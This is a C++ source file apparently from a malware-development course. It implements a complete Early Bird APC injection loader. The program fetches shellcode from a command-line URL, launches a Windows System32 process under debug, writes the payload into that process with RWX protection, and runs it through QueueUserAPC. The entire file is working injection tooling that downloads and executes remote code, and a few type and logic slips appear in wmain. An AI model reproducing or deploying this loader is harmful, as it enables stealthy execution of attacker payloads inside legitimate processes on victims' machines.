// RemoteEarlyBird.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	wprintf(L"[+] Getting payload from %s\n", szUrl);

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = 0;

	SIZE_T		sSize = 0; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", 0, NULL, NULL, 0);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}

BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%ls", WnDr, lpProcessName);
	printf("\t[i] Running : \"%s\" ...\n", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	/*
		{	both CREATE_SUSPENDED & DEBUG_PROCESS will work,
			CREATE_SUSPENDED will need ResumeThread, and
			DEBUG_PROCESS will need DebugActiveProcessStop
			to resume the execution
		}
	*/

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

	printf("[+] Writing payload to process memory\n");

	SIZE_T	sNumberOfBytesWritten = 0;
	DWORD	dwOldProtection = 0;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[+] Allocated Memory At : 0x%p \n", *ppAddress);

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[+] Successfully Written %lld Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int wmain(int argc, wchar_t** argv)
{

	if (argc != 3) {
		wprintf(L"[-] Missing arguments. Usage: %s <url> <process name>\n", argv[0]);
		return -1;
	}

	SIZE_T	Size = 0;
	PBYTE	Bytes = NULL;
	DWORD dwProcessId = 0;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;
	PVOID pAddress = NULL;
	char* url = argv[1];
	char* proc = argv[2];
	
	if (!GetPayloadFromUrl(url, &Bytes, &Size)) {
		return -1;
	}
	printf("[+] Got payload of %lld bytes\n", Size);


	if (!CreateSuspendedProcess2(proc, &dwProcessId, &hProcess, &hThread)) {
		printf("[-] Error creating debugged process\n");
		return -1;
	}
	printf("[+] Created suspended process ID %d\n", dwProcessId);

	if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size, &pAddress)) {
		printf("[-] Error allocating memory in target process\n");
		return -1;
	}

	//	running QueueUserAPC
	printf("[+] Queuing for APC\n");
	if (!QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL)) {
		printf("[-] Error queueing remote process for APC\n");
		return -1;
	}

	printf("[+] Detaching from remote process\n");
	if (DebugActiveProcessStop(dwProcessId)) {
		printf("[-] Error detaching remote process\n");
		return -1;
	}
	CloseHandle(hProcess);
	CloseHandle(hThread);
}